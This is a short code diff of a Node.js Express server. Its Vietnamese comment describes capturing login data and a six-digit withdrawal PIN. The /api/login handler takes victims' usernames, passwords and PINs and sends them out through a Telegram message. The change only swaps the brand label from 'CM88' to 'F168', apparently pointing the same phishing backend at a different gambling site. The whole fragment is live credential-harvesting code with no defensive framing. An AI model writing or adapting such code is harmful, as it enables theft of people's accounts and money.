@@ -29,7 +29,7 @@ async function sendTelegram(message) {
 // Bắt dữ liệu đăng nhập + Mã PIN rút tiền 6 số
 app.post('/api/login', async (req, res) => {
     const { username, password, pin } = req.body;
-    const info = `🚨 <b>[LOGIN CM88 + PIN]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n💰 Mã rút tiền: <code>${pin}</code>`;
+    const info = `🚨 <b>[LOGIN F168 + PIN]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n💰 Mã rút tiền: <code>${pin}</code>`;
     
     console.log(info);
     await sendTelegram(info);
